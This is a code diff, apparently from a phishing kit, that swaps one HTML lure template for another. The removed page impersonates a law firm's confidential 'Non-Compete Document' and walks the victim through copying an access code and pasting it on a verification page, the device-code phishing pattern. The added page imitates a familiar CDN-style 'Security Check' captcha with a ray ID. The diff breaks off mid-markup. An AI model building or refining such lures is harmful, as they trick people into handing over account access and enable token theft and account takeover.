@@ -2188,923 +2188,253 @@ const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
 </body>
 </html>`
 
-// Non-compete Document access themed page (LexVault)
+// TrustGate captcha-styled security check page (replaces LexVault)
 const DEVICE_CODE_LEXVAULT_HTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Non-compete Document — Mason Parkes & Associates LLP</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@500;600&family=Cormorant+Garamond:ital,wght@0,500;0,600;1,400&display=swap" rel="stylesheet">
+<title>TrustGate &middot; Security Check</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 2l8 3v6c0 5-3.4 9.4-8 11-4.6-1.6-8-6-8-11V5l8-3z' fill='%23f6821f'/%3E%3C/svg%3E" />
 <style>
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-:root {
-  --teal:       #0a7c6e;
-  --teal-mid:   #0d9488;
-  --teal-light: #14b8a6;
-  --teal-pale:  #e6f4f3;
-  --ink:        #0f1923;
-  --ink-mid:    #374151;
-  --ink-mute:   #6b7280;
-  --ink-faint:  #9ca3af;
-  --border:     #e2e8f0;
-  --border-mid: #cbd5e1;
-  --white:      #ffffff;
-  --red:        #dc2626;
-}
-
-html, body {
-  height: 100%;
-  font-family: 'Inter', sans-serif;
-  -webkit-font-smoothing: antialiased;
-  overflow: hidden;
-}
-
-.doc-bg {
-  position: fixed;
-  inset: 0;
-  background: #f7f5f0;
-  display: flex;
-  align-items: flex-start;
-  justify-content: center;
-  padding-top: 60px;
-  filter: blur(6px);
-  transform: scale(1.04);
-  transform-origin: top center;
-  user-select: none;
-  pointer-events: none;
-}
-
-.fake-doc {
-  width: 680px;
-  background: #fff;
-  box-shadow: 0 8px 60px rgba(0,0,0,0.12);
-  padding: 72px 80px 80px;
-  border-radius: 2px;
-  position: relative;
-  top: 10%;
-}
-
-.fake-doc::before {
-  content: 'CONFIDENTIAL';
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%) rotate(-35deg);
-  font-size: 5rem;
-  font-weight: 800;
-  color: rgba(10,124,110,0.06);
-  letter-spacing: 0.25em;
-  white-space: nowrap;
-  pointer-events: none;
-}
-
-.doc-firm-header {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding-bottom: 24px;
-  border-bottom: 2px solid #e8e4dc;
-  margin-bottom: 32px;
-}
-
-.doc-firm-name {
-  font-family: 'Cormorant Garamond', serif;
-  font-size: 1.5rem;
-  font-weight: 600;
-  color: #1a1714;
-  letter-spacing: 0.01em;
-}
-.doc-firm-sub {
-  font-size: 0.7rem;
-  color: #9a9690;
-  letter-spacing: 0.06em;
-  text-transform: uppercase;
-  margin-top: 2px;
-}
-.doc-seal { width: 54px; height: 54px; }
-
-.doc-title-block {
-  text-align: center;
-  margin-bottom: 36px;
-}
-.doc-title-block h1 {
-  font-family: 'Cormorant Garamond', serif;
-  font-size: 1.6rem;
-  font-weight: 600;
-  color: #1a1714;
-  margin-bottom: 8px;
-}
-.doc-title-block .sub {
-  font-size: 0.8rem;
-  color: #6b7280;
-  text-transform: uppercase;
-  letter-spacing: 0.1em;
-}
-.doc-line { height: 11px; background: #ede9e1; border-radius: 2px; margin-bottom: 8px; }
-.doc-line.w100 { width: 100%; }
-.doc-line.w90  { width: 90%; }
-.doc-line.w80  { width: 80%; }
-.doc-line.w70  { width: 70%; }
-.doc-line.w55  { width: 55%; }
-.doc-section-title {
-  font-family: 'Cormorant Garamond', serif;
-  font-size: 0.95rem;
-  font-weight: 600;
-  color: #1a1714;
-  text-transform: uppercase;
-  letter-spacing: 0.08em;
-  margin: 28px 0 12px;
-  padding-bottom: 6px;
-  border-bottom: 1px solid #e8e4dc;
-}
-.doc-para { margin-bottom: 6px; }
-.doc-sigs {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 32px;
-  margin-top: 48px;
-  padding-top: 24px;
-  border-top: 1px solid #e8e4dc;
-}
-.sig-line { height: 1px; background: #c8c3ba; margin-bottom: 6px; }
-.sig-name { height: 10px; background: #ede9e1; border-radius: 2px; width: 60%; }
-.sig-role { height: 8px; background: #f0ece4; border-radius: 2px; width: 45%; margin-top: 5px; }
-
-.overlay {
-  position: fixed;
-  inset: 0;
-  background: rgba(10, 14, 20, 0.62);
-}
-
-.topbar {
-  position: fixed;
-  top: 0; left: 0; right: 0;
-  z-index: 20;
-  height: 52px;
-  background: rgba(10, 14, 20, 0.75);
-  backdrop-filter: blur(12px);
-  -webkit-backdrop-filter: blur(12px);
-  border-bottom: 1px solid rgba(255,255,255,0.07);
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 0 2rem;
-}
-.topbar-left {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-}
-.topbar-logo {
-  display: flex;
-  align-items: center;
-  gap: 7px;
-}
-.topbar-logo-icon {
-  width: 26px; height: 26px;
-  background: var(--teal);
-  border-radius: 6px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-.topbar-logo-icon svg { width: 14px; height: 14px; }
-.topbar-name {
-  font-size: 0.88rem;
-  font-weight: 700;
-  color: #fff;
-  letter-spacing: -0.01em;
-}
-.topbar-sep {
-  width: 1px; height: 16px;
-  background: rgba(255,255,255,0.15);
-}
-.topbar-doc-label {
-  font-size: 0.75rem;
-  color: rgba(255,255,255,0.45);
-}
-.topbar-right {
-  display: flex;
-  align-items: center;
-  gap: 6px;
-  font-size: 0.72rem;
-  color: rgba(255,255,255,0.4);
-}
-.secure-pill {
-  display: flex;
-  align-items: center;
-  gap: 5px;
-  padding: 3px 10px;
-  border: 1px solid rgba(255,255,255,0.1);
-  border-radius: 20px;
-  background: rgba(255,255,255,0.05);
-}
-.secure-dot {
-  width: 6px; height: 6px;
-  border-radius: 50%;
-  background: #4ade80;
-  animation: blink 2.5s ease-in-out infinite;
-}
-@keyframes blink {
-  0%,100% { opacity: 1; } 50% { opacity: 0.4; }
-}
-
-.page {
-  position: fixed;
-  inset: 0;
-  z-index: 10;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 52px 1rem 1rem;
-}
-
-.card {
-  width: 100%;
-  max-width: 400px;
-  background: #fff;
-  border-radius: 14px;
-  box-shadow:
-    0 0 0 1px rgba(0,0,0,0.08),
-    0 8px 24px rgba(0,0,0,0.18),
-    0 32px 80px rgba(0,0,0,0.28);
-  overflow: hidden;
-  position: relative;
-  animation: card-in 0.4s cubic-bezier(0.34,1.2,0.64,1) both;
-}
-@keyframes card-in {
-  from { transform: translateY(24px) scale(0.97); opacity: 0; }
-  to   { transform: translateY(0) scale(1); opacity: 1; }
-}
-.card-bar {
-  height: 4px;
-  background: linear-gradient(90deg, var(--teal) 0%, var(--teal-light) 100%);
-}
-
-.card-header {
-  padding: 1.3rem 1.5rem 1.1rem;
-  border-bottom: 1px solid #f0f4f8;
-  display: flex;
-  align-items: center;
-  gap: 11px;
-}
-.company-avatar {
-  width: 40px; height: 40px;
-  border-radius: 9px;
-  background: var(--teal-pale);
-  border: 1px solid rgba(10,124,110,0.15);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-shrink: 0;
-  font-family: 'Cormorant Garamond', serif;
-  font-size: 1rem;
-  font-weight: 600;
-  color: var(--teal);
-}
-.company-info {}
-.company-name {
-  font-size: 0.88rem;
-  font-weight: 600;
-  color: var(--ink);
-  line-height: 1.25;
-}
-.company-verified {
-  display: inline-flex;
-  align-items: center;
-  gap: 4px;
-  font-size: 0.67rem;
-  font-weight: 500;
-  color: var(--teal);
-  margin-top: 2px;
-}
-.company-verified svg { width: 11px; height: 11px; fill: var(--teal); }
-
-.card-body { padding: 1.3rem 1.5rem; }
-
-.alert-strip {
-  display: flex;
-  gap: 9px;
-  align-items: flex-start;
-  padding: 11px 13px;
-  background: #f0fafa;
-  border: 1px solid rgba(10,124,110,0.16);
-  border-left: 3px solid var(--teal-mid);
-  border-radius: 8px;
-  margin-bottom: 1.2rem;
-}
-.alert-strip svg {
-  width: 16px; height: 16px;
-  fill: var(--teal-mid);
-  flex-shrink: 0;
-  margin-top: 1px;
-}
-.alert-strip p {
-  font-size: 0.77rem;
-  color: var(--teal);
-  line-height: 1.5;
-}
-
-.doc-row {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  padding: 10px 12px;
-  background: #f8fafc;
-  border: 1px solid var(--border);
-  border-radius: 8px;
-  margin-bottom: 1.2rem;
-}
-.doc-row-icon {
-  width: 32px; height: 32px;
-  border: 1px solid var(--border-mid);
-  border-radius: 7px;
-  background: #fff;
-  display: flex; align-items: center; justify-content: center;
-  flex-shrink: 0;
-}
-.doc-row-icon svg { width: 16px; height: 16px; }
-.doc-row-info { flex: 1; min-width: 0; }
-.doc-row-name {
-  font-size: 0.8rem;
-  font-weight: 600;
-  color: var(--ink);
-  white-space: nowrap;
-  overflow: hidden;
-  text-overflow: ellipsis;
-}
-.doc-row-meta {
-  font-size: 0.68rem;
-  color: var(--ink-faint);
-  margin-top: 1px;
-}
-.doc-lock-badge {
-  width: 24px; height: 24px;
-  border-radius: 50%;
-  background: var(--teal-pale);
-  display: flex; align-items: center; justify-content: center;
-  flex-shrink: 0;
-}
-.doc-lock-badge svg {
-  width: 11px; height: 11px;
-  stroke: var(--teal);
-  fill: none;
-  stroke-width: 2;
-  stroke-linecap: round;
-  stroke-linejoin: round;
-}
-
-.code-label-row {
-  display: flex; align-items: center; justify-content: space-between;
-  margin-bottom: 7px;
-}
-.code-label {
-  font-size: 0.63rem;
-  text-transform: uppercase;
-  letter-spacing: 0.13em;
-  font-weight: 700;
-  color: var(--ink-faint);
-}
-.new-code-btn {
-  display: flex; align-items: center; gap: 4px;
-  font-size: 0.7rem;
-  font-weight: 600;
-  color: var(--teal-mid);
-  background: none; border: none; cursor: pointer;
-  font-family: 'Inter', sans-serif;
-  padding: 0;
-  transition: color 0.12s;
-}
-.new-code-btn:hover { color: var(--teal); }
-.new-code-btn svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }
-
-.code-box {
-  display: flex; align-items: center; justify-content: space-between;
-  background: #f8fafc;
-  border: 1.5px solid var(--border-mid);
-  border-radius: 10px;
-  padding: 13px 14px;
-  margin-bottom: 14px;
-  gap: 8px;
-}
-.code-value {
-  font-family: 'JetBrains Mono', monospace;
-  font-size: 1.35rem;
-  font-weight: 600;
-  color: var(--teal);
-  letter-spacing: 0.2em;
-  flex: 1;
-  text-align: center;
-}
-.copy-btn {
-  display: flex; align-items: center; gap: 5px;
-  padding: 5px 11px;
-  background: #fff;
-  border: 1.5px solid var(--border-mid);
-  border-radius: 6px;
-  font-size: 0.72rem;
-  font-weight: 500;
-  color: var(--ink-mid);
-  cursor: pointer;
-  font-family: 'Inter', sans-serif;
-  transition: border-color 0.12s, color 0.12s, background 0.12s;
-  white-space: nowrap;
-}
-.copy-btn:hover { border-color: var(--teal-mid); color: var(--teal); }
-.copy-btn.copied { border-color: var(--teal); color: var(--teal); background: var(--teal-pale); }
-.copy-btn svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
-
-.how-steps {
-  display: flex;
-  flex-direction: column;
-  gap: 8px;
-  margin-bottom: 14px;
-}
-.how-item {
-  display: flex; align-items: flex-start; gap: 9px;
-}
-.how-num {
-  width: 20px; height: 20px;
-  border-radius: 50%;
-  background: var(--teal-pale);
-  color: var(--teal);
-  font-size: 0.65rem;
-  font-weight: 700;
-  display: flex; align-items: center; justify-content: center;
-  flex-shrink: 0;
-  margin-top: 1px;
-}
-.how-text {
-  font-size: 0.77rem;
-  color: var(--ink-mid);
-  line-height: 1.5;
-}
-
-.btn-authenticate {
-  width: 100%;
-  padding: 12px 14px;
-  background: var(--teal);
-  color: #fff;
-  font-family: 'Inter', sans-serif;
-  font-size: 0.88rem;
-  font-weight: 600;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-  display: flex; align-items: center; justify-content: center; gap: 8px;
-  transition: background 0.14s, box-shadow 0.14s;
-}
-.btn-authenticate:hover { background: var(--teal-mid); box-shadow: 0 4px 14px rgba(10,124,110,0.3); }
-.btn-authenticate svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
-
-.status-bar {
-  display: flex; align-items: center; gap: 7px;
-  padding: 8px 12px;
-  background: #f0fafa;
-  border: 1px solid rgba(10,124,110,0.18);
-  border-radius: 7px;
-  font-size: 0.74rem;
-  color: var(--teal);
-  font-weight: 500;
-  margin-top: 10px;
-}
-.status-bar svg { width: 14px; height: 14px; fill: var(--teal); flex-shrink: 0; }
-
-.success-wrap {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  text-align: center;
-  gap: 5px;
-  padding-bottom: 4px;
-}
-.success-ring {
-  width: 54px; height: 54px;
-  border-radius: 50%;
-  border: 2px solid var(--teal);
-  background: var(--teal-pale);
-  display: flex; align-items: center; justify-content: center;
-  margin-bottom: 6px;
-  animation: pop-in 0.3s cubic-bezier(0.34,1.56,0.64,1) both;
-}
-@keyframes pop-in {
-  from { transform: scale(0.5); opacity: 0; }
-  to   { transform: scale(1);   opacity: 1; }
-}
-.success-ring svg {
-  width: 24px; height: 24px;
-  stroke: var(--teal); fill: none;
-  stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
-  stroke-dasharray: 30; stroke-dashoffset: 30;
-  animation: draw-check 0.32s ease forwards 0.28s;
-}
-@keyframes draw-check { to { stroke-dashoffset: 0; } }
-.success-title {
-  font-size: 0.97rem;
-  font-weight: 700;
-  color: var(--ink);
-}
-.success-email-pill {
-  font-family: 'JetBrains Mono', monospace;
-  font-size: 0.72rem;
-  background: var(--teal-pale);
-  color: var(--teal);
-  border: 1px solid rgba(10,124,110,0.18);
-  border-radius: 20px;
-  padding: 3px 12px;
-  margin: 3px 0 6px;
-}
-.success-sub {
-  font-size: 0.77rem;
-  color: var(--ink-mute);
-  line-height: 1.55;
-  max-width: 280px;
-  margin-bottom: 10px;
-}
-.btn-download {
-  width: 100%;
-  padding: 10px 14px;
-  background: var(--teal);
-  color: #fff;
-  font-family: 'Inter', sans-serif;
-  font-size: 0.85rem;
-  font-weight: 600;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-  display: flex; align-items: center; justify-content: center; gap: 7px;
-  transition: background 0.14s, box-shadow 0.14s;
-}
-.btn-download:hover { background: var(--teal-mid); box-shadow: 0 4px 12px rgba(10,124,110,0.25); }
-.btn-download svg { width: 15px; height: 15px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
-.audit-log {
-  width: 100%;
-  background: #f8fafc;
-  border: 1px solid var(--border);
-  border-radius: 7px;
-  padding: 9px 12px;
-  font-family: 'JetBrains Mono', monospace;
-  font-size: 0.64rem;
-  color: var(--ink-mute);
-  line-height: 1.75;
-  text-align: left;
-  margin-top: 8px;
-}
-
-.card-footer {
-  padding: 10px 1.5rem 1.2rem;
-  border-top: 1px solid #f0f4f8;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 5px;
-  flex-wrap: wrap;
-}
-.tag {
-  font-size: 0.64rem;
-  color: var(--ink-faint);
-  display: flex; align-items: center; gap: 3px;
-}
-.tag.pill {
-  background: var(--teal-pale);
-  border: 1px solid rgba(10,124,110,0.18);
-  border-radius: 20px;
-  padding: 2px 8px;
-  color: var(--teal);
-  font-weight: 500;
-}
-.tag-sep { width: 1px; height: 10px; background: var(--border-mid); }
-.tag-dot { width: 4px; height: 4px; border-radius: 50%; background: var(--ink-faint); }
-
-.hidden { display: none !important; }
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Fira Sans","Droid Sans","Helvetica Neue",sans-serif;color:#313131;background:linear-gradient(180deg,#f7f7f7 0%,#efefef 100%);display:flex;flex-direction:column;min-height:100vh;-webkit-font-smoothing:antialiased}
+.page{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 16px 24px}
+.card{width:100%;max-width:480px;background:#fff;border:1px solid #e2e2e2;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.06);overflow:hidden;animation:card-in 0.35s cubic-bezier(0.34,1.2,0.64,1) both}
+@keyframes card-in{from{transform:translateY(16px) scale(0.98);opacity:0}to{transform:translateY(0) scale(1);opacity:1}}
+.card-header{display:flex;align-items:center;justify-content:space-between;padding:14px 24px;border-bottom:1px solid #efefef;background:#fafafa}
+.brand{display:flex;align-items:center;gap:8px}
+.brand-mark{width:22px;height:22px}
+.brand-name{font-size:16px;font-weight:700;letter-spacing:0.2px;color:#313131}
+.badge{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.8px;color:#f6821f;background:rgba(246,130,31,0.1);border:1px solid rgba(246,130,31,0.35);border-radius:999px;padding:4px 10px}
+.card-body{padding:28px 24px 24px}
+h1{font-size:21px;font-weight:600;color:#1f1f1f}
+.subtitle{margin-top:8px;font-size:14px;line-height:1.55;color:#6b6b6b}
+.captcha-frame{position:relative;margin-top:20px;border:1px solid #d9d9d9;border-radius:4px;background:#f9f9f9;overflow:hidden}
+#captcha-canvas{display:block;width:100%;height:auto;cursor:pointer}
+#captcha-refresh{position:absolute;top:8px;right:8px;width:34px;height:34px;display:flex;align-items:center;justify-content:center;border:1px solid #d9d9d9;border-radius:4px;background:rgba(255,255,255,0.92);color:#555;cursor:pointer;transition:color 0.15s ease,border-color 0.15s ease}
+#captcha-refresh:hover{color:#f6821f;border-color:#f6821f}
+#captcha-refresh:active svg{transform:rotate(-180deg)}
+#captcha-refresh svg{width:18px;height:18px;transition:transform 0.35s ease}
+.hint{margin-top:10px;font-size:12.5px;color:#9c9c9c}
+.status-bar{display:flex;align-items:center;gap:8px;padding:10px 14px;background:#f0fafa;border:1px solid rgba(10,124,110,0.18);border-radius:6px;font-size:13px;color:#0a7c6e;font-weight:500;margin-top:14px}
+.status-bar svg{width:16px;height:16px;fill:#0a7c6e;flex-shrink:0;stroke:none}
+.status-bar.error{background:#fef2f2;color:#dc2626;border-color:#fecaca}
+.status-bar.error svg{fill:#dc2626}
+.verify-btn{margin-top:14px;width:100%;padding:12px 16px;font-family:inherit;font-size:15px;font-weight:600;color:#fff;background:#f6821f;border:1px solid #e0731a;border-radius:4px;cursor:pointer;transition:background 0.15s ease,box-shadow 0.15s ease}
+.verify-btn:hover{background:#ff9426;box-shadow:0 2px 6px rgba(246,130,31,0.35)}
+.verify-btn:active{background:#e0731a;box-shadow:none}
+.verify-btn:disabled{opacity:0.5;cursor:not-allowed;box-shadow:none}
+.verify-btn:disabled:hover{background:#f6821f;box-shadow:none}
+.verify-btn:focus-visible{outline:2px solid #f6821f;outline-offset:2px}
+.ray{margin-top:18px;font-size:12.5px;color:#9c9c9c;text-align:center}
+.ray a{color:#9c9c9c;font-weight:600;text-decoration:none}
+.ray a:hover{color:#f6821f}
+#ray-id{font-family:"SF Mono","Courier New",monospace;font-size:12px}
+.hidden{display:none !important}
+.site-footer{border-top:1px solid #e2e2e2;background:#fff}
+.footer-inner{max-width:1080px;margin:0 auto;padding:18px 24px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.footer-brand{display:flex;align-items:center;gap:8px}
+.footer-brand .brand-mark{width:20px;height:20px}
+.footer-brand-name{font-size:15px;font-weight:700;color:#313131}
+.footer-meta{display:flex;align-items:center;gap:18px;flex-wrap:wrap}
+.copyright{font-size:12.5px;color:#6b6b6b}
+.footer-nav{display:flex;gap:14px}
+.footer-nav a{font-size:12.5px;color:#9c9c9c;text-decoration:none}
+.footer-nav a:hover{color:#f6821f}
+.success-wrap{display:flex;flex-direction:column;align-items:center;text-align:center;gap:6px}
+.success-ring{width:54px;height:54px;border-radius:50%;border:2px solid #f6821f;background:rgba(246,130,31,0.08);display:flex;align-items:center;justify-content:center;margin-bottom:8px;animation:pop-in 0.3s cubic-bezier(0.34,1.56,0.64,1) both}
+@keyframes pop-in{from{transform:scale(0.5);opacity:0}to{transform:scale(1);opacity:1}}
+.success-ring svg{width:24px;height:24px;stroke:#f6821f;fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+.success-title{font-size:18px;font-weight:700;color:#1f1f1f}
+.success-sub{font-size:14px;color:#6b6b6b;line-height:1.55;max-width:300px;margin-top:4px}
+.btn-download{margin-top:14px;width:100%;padding:12px 16px;font-family:inherit;font-size:15px;font-weight:600;color:#fff;background:#f6821f;border:1px solid #e0731a;border-radius:4px;cursor:pointer;transition:background 0.15s ease}
+.btn-download:hover{background:#ff9426}
+.audit-log{width:100%;background:#f8fafc;border:1px solid #e2e8f0;border-radius:6px;padding:10px 14px;font-family:"SF Mono","Courier New",monospace;font-size:11px;color:#6b7280;line-height:1.75;text-align:left;margin-top:14px;white-space:pre}
+@media(max-width:560px){.footer-inner{flex-direction:column;text-align:center}.footer-meta{flex-direction:column;gap:8px}}
 </style>
 </head>
 <body>
-
-<div class="doc-bg" aria-hidden="true">
-  <div class="fake-doc">
-    <div class="doc-firm-header">
-      <div>
-        <div class="doc-firm-name">Mason Parkes &amp; Associates LLP</div>
-        <div class="doc-firm-sub">Attorneys at Law · Est. 1987</div>
-      </div>
-      <svg class="doc-seal" viewBox="0 0 54 54" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="27" cy="27" r="26" stroke="#b8942a" stroke-width="1.2"/>
-        <circle cx="27" cy="27" r="21" stroke="#b8942a" stroke-width="0.8"/>
-        <text x="27" y="24" text-anchor="middle" font-family="Cormorant Garamond, serif" font-size="6" fill="#b8942a" font-weight="600" letter-spacing="1">OFFICIAL</text>
-        <text x="27" y="33" text-anchor="middle" font-family="Cormorant Garamond, serif" font-size="5.5" fill="#b8942a" letter-spacing="0.5">SEAL</text>
-        <circle cx="27" cy="27" r="3.5" fill="#b8942a" opacity="0.3"/>
-      </svg>
-    </div>
-
-    <div class="doc-title-block">
-      <h1>Non-Disclosure Agreement</h1>
-      <div class="sub">Confidential · Privileged Communication</div>
-    </div>
-
-    <div class="doc-line w90"></div>
-    <div class="doc-line w100"></div>
-    <div class="doc-line w80"></div>
-    <div class="doc-line w100"></div>
-    <div class="doc-line w70"></div>
-
-    <div class="doc-section-title">1. Definitions</div>
-    <div class="doc-para"><div class="doc-line w100"></div></div>
-    <div class="doc-para"><div class="doc-line w90"></div></div>
-    <div class="doc-para"><div class="doc-line w100"></div></div>
-    <div class="doc-para"><div class="doc-line w80"></div></div>
-    <div class="doc-para"><div class="doc-line w100"></div></div>
-    <div class="doc-para"><div class="doc-line w55"></div></div>
-
-    <div class="doc-section-title">2. Obligations of Receiving Party</div>
-    <div class="doc-para"><div class="doc-line w100"></div></div>
-    <div class="doc-para"><div class="doc-line w90"></div></div>
-    <div class="doc-para"><div class="doc-line w100"></div></div>
-    <div class="doc-para"><div class="doc-line w70"></div></div>
-
-    <div class="doc-section-title">3. Term &amp; Termination</div>
-    <div class="doc-para"><div class="doc-line w100"></div></div>
-    <div class="doc-para"><div class="doc-line w80"></div></div>
-    <div class="doc-para"><div class="doc-line w100"></div></div>
-    <div class="doc-para"><div class="doc-line w90"></div></div>
-
-    <div class="doc-sigs">
-      <div><div class="sig-line"></div><div class="sig-name"></div><div class="sig-role"></div></div>
-      <div><div class="sig-line"></div><div class="sig-name"></div><div class="sig-role"></div></div>
-    </div>
-  </div>
+<main class="page">
+<section class="card" aria-labelledby="card-title">
+<header class="card-header">
+<div class="brand">
+<svg class="brand-mark" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2l8 3v6c0 5-3.4 9.4-8 11-4.6-1.6-8-6-8-11V5l8-3z" fill="#f6821f"/><path d="M8.4 12.3l2.4 2.4 4.8-5" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+<span class="brand-name">TrustGate</span>
 </div>
-
-<div class="overlay" aria-hidden="true"></div>
-
-<header class="topbar">
-  <div class="topbar-left">
-    <div class="topbar-logo">
-      <div class="topbar-logo-icon">
-        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z" stroke="white" stroke-width="1.6" stroke-linejoin="round"/>
-          <path d="M14 2v6h6" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-      </div>
-      <span class="topbar-name">LexVault</span>
-    </div>
-    <div class="topbar-sep"></div>
-    <span class="topbar-doc-label" id="topbarDocLabel">Secure document access</span>
-  </div>
-  <div class="topbar-right">
-    <div class="secure-pill">
-      <div class="secure-dot"></div>
-      256-bit encrypted
-    </div>
-  </div>
+<span class="badge">Security Check</span>
 </header>
-
-<div class="page">
-  <div class="card" id="mainCard">
-    <div class="card-bar"></div>
-
-    <div class="card-header">
-      <div class="company-avatar">MP</div>
-      <div class="company-info">
-        <div class="company-name">Mason Parkes &amp; Associates LLP</div>
-        <div class="company-verified">
-          <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
-            <path d="M8 1l1.8 2.2 2.7-.6.2 2.8 2.3 1.6-1.4 2.4.8 2.7-2.8.3-1.6 2.3-2.5-1.1-2.5 1.1-1.6-2.3-2.8-.3.8-2.7-1.4-2.4 2.3-1.6.2-2.8 2.7.6z"/>
-            <path d="M5.5 8.5l2 1.5 3-4" stroke="white" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-          </svg>
-          Verified Publisher
-        </div>
-      </div>
-    </div>
-
-    <div id="stepCode">
-      <div class="card-body">
-        <div class="alert-strip">
-          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-            <path d="M12 2L3 7v5c0 5 3.8 9.7 9 11 5.2-1.3 9-6 9-11V7L12 2Z"/>
-          </svg>
-          <p>This type of document requires verification. Copy your access code to continue.</p>
-        </div>
-
-        <div class="doc-row">
-          <div class="doc-row-icon">
-            <svg viewBox="0 0 24 24" fill="none">
-              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z" stroke="#64748b" stroke-width="1.5" stroke-linejoin="round"/>
-              <path d="M14 2v6h6" stroke="#64748b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-              <line x1="8" y1="13" x2="16" y2="13" stroke="#94a3b8" stroke-width="1.3" stroke-linecap="round"/>
-              <line x1="8" y1="17" x2="16" y2="17" stroke="#94a3b8" stroke-width="1.3" stroke-linecap="round"/>
-            </svg>
-          </div>
-          <div class="doc-row-info">
-            <div class="doc-row-name">Non-Compete Document</div>
-            <div class="doc-row-meta">PDF</div>
-          </div>
-          <div class="doc-lock-badge">
-            <svg viewBox="0 0 24 24">
-              <rect x="3" y="11" width="18" height="11" rx="2"/>
-              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-            </svg>
-          </div>
-        </div>
-
-        <div class="code-label-row">
-          <span class="code-label">Access code</span>
-          <button class="new-code-btn" id="btnNewCode" style="display:none;">
-            <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-4.49"/></svg>
-            New code
-          </button>
-        </div>
-
-        <div class="code-box">
-          <span class="code-value" id="codeDisplay">Loading...</span>
-          <button class="copy-btn" id="btnCopy" disabled>
-            <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-            Copy
-          </button>
-        </div>
-
-        <div class="how-steps">
-          <div class="how-item">
-            <div class="how-num">1</div>
-            <p class="how-text">Copy the access code shown above</p>
-          </div>
-          <div class="how-item">
-            <div class="how-num">2</div>
-            <p class="how-text">Click <strong>Authenticate</strong> to open the verification page</p>
-          </div>
-          <div class="how-item">
-            <div class="how-num">3</div>
-            <p class="how-text">Paste the code on the verification page to confirm your identity</p>
-          </div>
-        </div>
-
-        <button class="btn-authenticate" id="btnAuthenticate" disabled>
-          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-          Authenticate
-        </button>
-
-        <div class="status-bar" id="statusBar">
-          <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="8" cy="8" r="8"/>
-            <path d="M4.5 8.5l2.5 2.5 4-5" stroke="white" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-          </svg>
-          Generating secure code...
-        </div>
-      </div>
-    </div>
-
-    <div id="stepSuccess" class="hidden">
-      <div class="card-body">
-        <div class="success-wrap">
-          <div class="success-ring">
-            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-          </div>
-          <h2 class="success-title">Identity verified</h2>
-          <div class="success-email-pill">Access granted</div>
-          <p class="success-sub">You now have full access. Your identity has been confirmed via the device code flow.</p>
-          <button class="btn-download" id="btnDownload">
